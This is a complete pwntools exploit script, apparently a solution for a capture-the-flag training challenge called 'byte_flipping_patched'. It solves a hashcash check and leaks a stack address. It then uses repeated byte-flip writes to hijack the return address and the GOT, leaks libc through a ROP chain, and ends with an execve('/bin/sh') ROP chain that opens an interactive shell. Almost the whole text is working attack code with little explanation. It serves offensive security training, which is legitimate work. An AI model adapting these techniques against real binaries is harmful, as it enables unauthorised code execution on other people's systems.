from pwn import *
import time
import subprocess


CHALL_PATH = "./byte_flipping_patched"
CHALL = ELF(CHALL_PATH)
LIBC = ELF("./libc.so.6")

COMMANDS = """
b  *0x4011fd
#b *0x4012FF 
#b *0x4013E3
#b *0x401284
c
"""

flipping_value = 0x41 # initial value due the A's in the name

flips_counter = 0x404050

puts_got = 0x404000
stack_chk_fail_got = 0x404008

pop_rbp_ret = 0x4011fd
welcome_112 = 0x40131a

def generate_hashcash(resource):
    # Construct the command with the specified resource
    command = ['hashcash', '-mb25', resource]
    
    try:
        # Run the command and capture the output
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        
        # # Print the output from the command
        # print("Hashcash output:")
        # print(result.stdout)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print("An error occurred while running hashcash:", e)
        print("Error output:", e.stderr)

if args.REMOTE:
    c = remote("byte-flipping.training.offensivedefensive.it",8080,ssl=True)
    resource = c.recvline().strip().split(b": ")[1]
    resource = resource.decode()
    hash = generate_hashcash(resource)
    print(hash)
    c.send(hash)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, COMMANDS)
    else:
        c = process(CHALL_PATH)


def write_byte(address, value):
    global flipping_value
    # print("flipping value: ", hex(flipping_value))
    tmp = value
    value = value ^ flipping_value # xor with the previous value to get the correct value

    c.recvuntil(b"Address: ")
    c.sendline(b"0x%x" % address)
    time.sleep(0.1)
    c.recvuntil(b"Value: ")
    c.sendline(b"0x%x" % value)

    flipping_value = tmp # update the flipping value

# given a value, split it into bytes 0x404142 -> [0x42, 0x41, 0x40]
# if padding is used it add 0x00 bytes at the end of the array: padding=3 -> [0x42, 0x41, 0x40, 0x00, 0x00, 0x00]
def split_bytes(value, padding=0):
    num_bytes = (value.bit_length() + 7) // 8
    byte_array = list(value.to_bytes(num_bytes, byteorder='little'))
    byte_array += [0x00] * (padding - len(byte_array))
    return byte_array

def write(address, value):
    for i in range(len(value)):
        write_byte(address + i, value[i])


def leak_stack():
    c.recvuntil(b"What's your name: ")
    name = b"A" * 32 
    c.sendline(name)
    c.recvuntil(name)
    name_ptr = c.recvuntil(b" ;)")[:-len(b" ;)")]
    name_ptr = name_ptr.ljust(8, b"\x00")
    name_ptr = u64(name_ptr)
    sRIP_play = name_ptr + 0x38
    #print(f"name_ptr leaked: {hex(name_ptr)}")
    #print(f"sRIP is at: {hex(sRIP_play)}")
    return sRIP_play


# [!] first execution we have 3 writes so we need to use write_byte
sRIP_play = leak_stack()
write_byte(sRIP_play, 0x30)         # overwrite the return address with the 
write_byte(sRIP_play + 0x01, 0x11)  # address of the _start to restart the program 
write_byte(flips_counter, 3 + 8 + 8 + 8 + 1)  # overwrite the counter to  make the program ask for more writes
print("Restarting the program 1...")
time.sleep(0.1)

# [!] second execution now we can use write, having more available writes

# welcome+112 (0x40131a) does 
# lea rax [rbp-0x30]
# mov rdi rax
# printf 
# so we have to change the value of 
# rbp-0x30 to the address of the puts@got

flipping_value = 0x41                                                # reset the flipping value for new execution
sRIP_play = leak_stack()
rop_chain = [
    pop_rbp_ret,
    puts_got + 0x30,
    welcome_112,
]
write(stack_chk_fail_got, split_bytes(CHALL.symbols["_start"], padding=3))   # avoid crash after leak, restart program instead 
for i in range(len(rop_chain)):
    write(sRIP_play+(i * 8), split_bytes(rop_chain[i], padding=8))           
write_byte(flips_counter, 9*8)                                       # overwrite the counter to  make the program ask for more writes
print("Restarting the program 2...")
time.sleep(0.1)

# Leak puts@LIBC
leak_libc = c.recvuntil(b";)").strip().split()[-2]
leak_libc = leak_libc.ljust(8, b'\x00')
leak_libc = u64(leak_libc)
print(f"Leaked libc address: {hex(leak_libc)}")
LIBC.address = leak_libc - LIBC.symbols["puts"]

# [!] third execution now we can use a rop chain from libc to get a shell

flipping_value = 0x41                                                # reset the flipping value for new execution
sRIP_play = leak_stack()

# libc gadgets:
pop_rdx_ret = LIBC.address + 0x188035                                # [!] pop rdx; bsf eax, eax; add rax, rdi; vzeroupper; ret; 
pop_rax_ret = LIBC.address + 0x0dd237                                 
pop_rsi_ret = LIBC.address + 0x110a4d                                 
pop_rdi_ret = LIBC.address + 0x10f75b                                 
syscall_ret = LIBC.address + 0x098fa6                                

rop_chain = [
    pop_rdx_ret,
    0x0,
    pop_rax_ret,
    0x3b,
    pop_rsi_ret,
    0x0,
    pop_rdi_ret,
    next(LIBC.search(b"/bin/sh\x00")),
    syscall_ret,
]

for i in range(len(rop_chain)):
    write(sRIP_play+(i * 8), split_bytes(rop_chain[i], padding=8)) 

c.interactive()
